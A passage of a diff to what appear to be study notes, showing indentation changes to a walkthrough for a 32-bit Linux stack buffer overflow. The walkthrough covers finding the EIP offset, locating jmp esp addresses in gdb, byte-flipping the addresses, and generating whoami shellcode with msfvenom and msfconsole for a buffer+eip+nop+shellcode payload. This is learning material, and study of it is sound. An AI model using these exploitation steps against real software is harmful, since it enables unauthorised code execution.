@@ -1881,43 +1881,43 @@ buffer = "A" * 40 # This number changes to find the buffer size.
 print(buffer)
 ```
 
-  		- Using gdb use run <<<$(./bufferoverflow.py) to change the buffer size and get a feel for the size of the buffer
-    		- Wiremask.eu -> Tools -> BufferOverflowPatternGenerator -> Copy the 200 byte pattern and paste it as the "buffer" variable
-      		- run <<<$(./bufferoverflow.py)
-			- COPY HEX VALUE FROM THE EIP and paste it inside Wiremask.eu --> BufferOverflowPatternGenerator to find the OFFSET
-   			- Once OFFSET is found adjust the buffer variable to match the value (62)
-      			- Now we create a "eip" variable set to "BBBB"
-	 		- Change Print line to print(buffer+eip)
-			- When we run the run <<<$(./bufferoverflow.py) with the changes we can verify if BBBB is written into the EIP register
-   			- Open new window and Open GDB inside a clean environment with "env -gdb ./func"
-      			- "show env" will show us env variables and we will unset ALL values using "unset env {VARIABLE}"
-	 		- NORMAL GDB ASSEMBLY LOCATIONS inside (gdb) "run" to see memory location
-    			- NORMAL GDB run "info proc map" and COPY the START of next memory address down from the [HEAP] and the END of [STACK] Line
-       			- PASTE noth  into your python script as "find /b {address1}, {address2}, 0xff, 0xe4" COPY THIS AND PASTE IN NORMAL GDB
-	  		- PASTE INTO NORMAL GDB "find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4" and grab the FIRST 4 addresses as these are the first jump esp locations
-     			- PASTE the 4 locations into your SCRIPT THEN BREAK INTO BYTES AND FLIP
+	-Using gdb use run <<<$(./bufferoverflow.py) to change the buffer size and get a feel for the size of the buffer
+    	- Wiremask.eu -> Tools -> BufferOverflowPatternGenerator -> Copy the 200 byte pattern and paste it as the "buffer" variable
+      	- run <<<$(./bufferoverflow.py)
+		- COPY HEX VALUE FROM THE EIP and paste it inside Wiremask.eu --> BufferOverflowPatternGenerator to find the OFFSET
+   		- Once OFFSET is found adjust the buffer variable to match the value (62)
+      		- Now we create a "eip" variable set to "BBBB"
+	 	- Change Print line to print(buffer+eip)
+		- When we run the run <<<$(./bufferoverflow.py) with the changes we can verify if BBBB is written into the EIP register
+   		- Open new window and Open GDB inside a clean environment with "env -gdb ./func"
+      		- "show env" will show us env variables and we will unset ALL values using "unset env {VARIABLE}"
+	 	- NORMAL GDB ASSEMBLY LOCATIONS inside (gdb) "run" to see memory location
+    		- NORMAL GDB run "info proc map" and COPY the START of next memory address down from the [HEAP] and the END of [STACK] Line
+       		- PASTE noth  into your python script as "find /b {address1}, {address2}, 0xff, 0xe4" COPY THIS AND PASTE IN NORMAL GDB
+	  	- PASTE INTO NORMAL GDB "find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4" and grab the FIRST 4 addresses as these are the first jump esp locations
+     		- PASTE the 4 locations into your SCRIPT THEN BREAK INTO BYTES AND FLIP
 					- 0xf7de3b59 --> 0xf7 de 3b 59 --> "\x59\x3b\xde\xf7" FINAL
      					- 0xf7f588ab --> 0xf7 f5 88 ab --> "\xab\x88\xf5\xf7" FINAL
 					- 0xf7f645fb --> 0xf7 f6 45 fb --> "\xfb\x45\xf6\xf7" FINAL
      					- 0xf7f6460f --> 0xf7 f6 64 0f --> "\x0f\x64\xf6\xf7" FINAL
-	  		- QUIT NORMAL GDB using "quit"
-     			- Now we can Generate SHELL CODE using MSFVENOM / MSFCONSOLE
-			- MSFVENOM (Creating shell code)
+	  	- QUIT NORMAL GDB using "quit"
+     		- Now we can Generate SHELL CODE using MSFVENOM / MSFCONSOLE
+		- MSFVENOM (Creating shell code)
    				- msfvenom --list payloads
 				- msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
-    			-MSFCONSOLE 
+    		-MSFCONSOLE 
        				- msfdb init
 	   			- msfconsole
        				- use payload/linux/x86/exec
 	   			- show options
        				- set CMD whoami
 	   			- generate -b '\x00' -f python
-    			- COPY FIRST JMP LOCATION \x59\x3b\xde\xf7 and insert it in your "eip" variable as (eip = "\x59\x3b\xde\xf7")
-       			- CREATE a (nop = "\x90" * 15) Variable
-	  		- COPY and paste your msfvenom output into script
-	  		- CHANGE PRINT to "print(buffer+eip+nop+buf)"
-     			- run <<<$(./bufferoverflow.py) with saved changes if it doesnt work we have to REGENERATE SHELL CODE from MSFCONSOLE/VENOM
-			- BELOW has the final script and exploit used
+    		- COPY FIRST JMP LOCATION \x59\x3b\xde\xf7 and insert it in your "eip" variable as (eip = "\x59\x3b\xde\xf7")
+       		- CREATE a (nop = "\x90" * 15) Variable
+	  	- COPY and paste your msfvenom output into script
+	  	- CHANGE PRINT to "print(buffer+eip+nop+buf)"
+     		- run <<<$(./bufferoverflow.py) with saved changes if it doesnt work we have to REGENERATE SHELL CODE from MSFCONSOLE/VENOM
+		- BELOW has the final script and exploit used
 ```
 #!/usr/bin/env python
 
